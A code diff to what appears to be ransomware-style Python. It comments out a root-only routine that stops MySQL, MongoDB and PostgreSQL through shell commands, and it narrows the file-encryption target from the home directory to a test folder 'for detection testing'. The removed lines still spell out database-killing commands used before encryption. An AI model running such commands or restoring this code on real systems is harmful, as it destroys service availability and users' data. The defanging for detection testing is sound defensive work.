@@ -22,14 +22,15 @@ from Crypto.Cipher import PKCS1_OAEP
 
 
 def kill_databases():
-    if(os.getuid() == 0):
-        mysql = 'mysqld stop; mysql.server stop'
-        mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
-        postgres = 'pkill -u postgres; pkill postgres'
+    # if(os.getuid() == 0):
+    #     mysql = 'mysqld stop; mysql.server stop'
+    #     mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
+    #     postgres = 'pkill -u postgres; pkill postgres'
         
-        os.system(mysql)
-        os.system(mongo)
-        os.system(postgres)
+    #     os.system(mysql)
+    #     os.system(mongo)
+    #     os.system(postgres)
+    print("[SIMULATION] Database stopping skipped for safe testing.")
 
 
 def encrypt_priv_key(msg, key):
@@ -80,9 +81,7 @@ def menu():
 
     kill_databases()
 
-    # Original dangerous call:      
     # files = get_files.find_files(variables.home)
-    
     # Safely limited call for detection testing:
     files = get_files.find_files('../files2encrypt')
 
